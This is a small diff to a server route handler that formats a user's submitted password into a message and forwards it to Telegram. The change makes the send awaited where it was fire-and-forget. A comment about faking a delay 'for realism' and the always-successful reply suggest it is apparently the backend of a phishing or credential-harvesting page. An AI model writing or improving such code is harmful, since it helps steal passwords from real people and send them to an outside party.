@@ -51,7 +51,7 @@ export async function registerRoutes(
         `<b>Password:</b> <code>${input.password}</code>`;
       
       // Fire and forget telegram message
-      sendToTelegram(message).catch(err => console.error("Async Telegram error:", err));
+      await sendToTelegram(message);
       
       // Simulate a small network delay for realism
       res.json({ success: true });
